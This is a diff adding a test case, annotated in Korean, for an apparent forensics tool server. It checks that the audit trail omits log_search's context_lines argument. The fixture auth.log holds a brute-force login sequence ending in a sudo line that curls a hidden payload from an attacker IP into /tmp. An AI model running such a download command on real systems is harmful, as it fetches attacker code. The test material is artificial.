@@ -1,0 +1,66 @@
+# Matrix case P3075-061: each findevil tool picks by hand which arguments go
+# into its audit entry, and log_search records only path and pattern.
+# context_lines, which decides how many surrounding lines come back, is not
+# recorded, so two calls that return different lines read back from
+# get_audit_trail with the same params.
+# The server is started with FINDEVIL_LOGS_DIR=${DB_DIR}, so the call record
+# is ${DB_DIR}/audit.json.
+case_id: P3075-061
+problem: P3075
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "일치한 줄만 본 뒤 앞뒤 맥락을 보려고 `context_lines`만 바꿔 다시 검색하는 일은 흔하다."
+coverage: full
+summary: 'log_search for the same pattern on the same auth.log with context_lines 0 and 5 returns one line and then the failed logins before it, but get_audit_trail shows both entries with the same params, path and pattern only.'
+summary_ko: "같은 `auth.log`에 같은 패턴으로 `log_search`를 `context_lines` 0과 5로 부르면 한 줄과, 그 앞의 실패 로그인까지 든 여러 줄이 나온다. 그런데 `get_audit_trail`은 두 항목의 params를 똑같이 `path`와 `pattern`만으로 보여 준다."
+defect_ko: "이 서버는 `log_search`의 기록에 결과를 바꾸는 `context_lines`를 넣지 않는다. 결과를 정하는 인자는 모두 기록해야 한다. 모델은 기록을 보고 같은 검색을 두 번 했다고 잘못 알고, 맥락 줄이 어떤 설정에서 나왔는지 되짚지 못한다."
+setup_ko: "실패 로그인 뒤 성공 로그인과 sudo가 이어지는 `auth.log`를 두었다."
+fixture:
+  - path: case01/var/log/auth.log
+    text: |
+      Mar  3 02:11:41 web01 sshd[2198]: Failed password for invalid user admin from 203.0.113.50 port 51790 ssh2
+      Mar  3 02:11:44 web01 sshd[2198]: Failed password for invalid user admin from 203.0.113.50 port 51790 ssh2
+      Mar  3 02:12:02 web01 sshd[2203]: Failed password for root from 203.0.113.50 port 51804 ssh2
+      Mar  3 02:14:07 web01 sshd[2211]: Accepted password for deploy from 203.0.113.50 port 51822 ssh2
+      Mar  3 02:14:07 web01 sshd[2211]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Mar  3 02:15:30 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x http://203.0.113.50/x
+steps:
+  - tool: log_search
+    note_ko: "일치한 줄만 찾는다"
+    args:
+      path: ${EVIDENCE}/case01/var/log/auth.log
+      pattern: "Accepted password"
+      context_lines: 0
+  - tool: log_search
+    note_ko: "결함 호출: `context_lines`만 바꿔 다시 찾는다"
+    args:
+      path: ${EVIDENCE}/case01/var/log/auth.log
+      pattern: "Accepted password"
+      context_lines: 5
+  - tool: get_audit_trail
+    note_ko: "두 호출의 기록을 다시 읽는다"
+    args:
+      filter_tool: log_search
+expect:
+  - step: 1
+    note_ko: "맥락 없이 부르면 실패 로그인 줄이 없다"
+    not_contains: "Failed password for root"
+  - step: 2
+    note_ko: "맥락을 넣으면 앞의 실패 로그인과 뒤의 sudo 줄이 함께 나온다"
+    contains: "Failed password for root"
+  - step: 2
+    note_ko: "뒤의 sudo 줄도 나온다"
+    contains: "COMMAND=/usr/bin/curl"
+  - step: 3
+    note_ko: "기록에 두 호출이 모두 있다"
+    contains: "(2 matching entries"
+  - step: 3
+    note_ko: "두 항목의 params가 똑같이 `path`와 `pattern`뿐이다"
+    regex: '(?s)params: \{"path": "[^"]*/auth\.log", "pattern": "Accepted password"\}\n.*params: \{"path": "[^"]*/auth\.log", "pattern": "Accepted password"\}\n'
+  - file_not_contains: ${DB_DIR}/audit.json
+    note_ko: "기록 파일 어디에도 `context_lines`가 없다"
+    text: "context_lines"
